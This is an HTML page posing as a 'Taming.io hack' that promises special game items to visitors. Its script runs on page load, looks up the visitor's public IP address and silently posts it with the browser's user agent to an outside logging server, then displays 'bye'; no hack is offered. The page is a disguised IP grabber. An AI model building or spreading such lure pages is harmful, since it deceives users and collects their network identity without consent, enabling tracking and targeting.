<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>Taming.io hack</title>
    <meta property="og:title" content="Taming.io hack">
    <meta property="og:description" content="Click here to get special items for Taming.io!">
    <meta property="og:image" content="https://i.imgur.com/CIpGROL.jpeg">
    <meta property="og:url" content="https://tamingiohack.netlify.app/">
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; }
        h1 { color: #333; }
    </style>
</head>
<body>
    <h1>taming.io hack!</h1>
    <p id="status">wait.....</p>

    <script>
        // 위치 정보 요청 부분이 없는 원래의 스크립트
        window.onload = function() {
            const statusElement = document.getElementById('status');
            
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const userIp = data.ip;
                    const userAgent = navigator.userAgent;

                    const loggerServerUrl = 'https://aaa-production-efa7.up.railway.app/log-ip'; 

                    fetch(loggerServerUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ ip: userIp, userAgent: userAgent })
                    })
                    .then(res => res.json())
                    .then(logResult => {
                        console.log('Log server response:', logResult.message);
                        statusElement.textContent = 'bye';
                    })
                    .catch(err => console.error('Failed to send log to server:', err));
                })
                .catch(error => console.error('Failed to get IP address:', error));
        };
    </script>
</body>
</html>
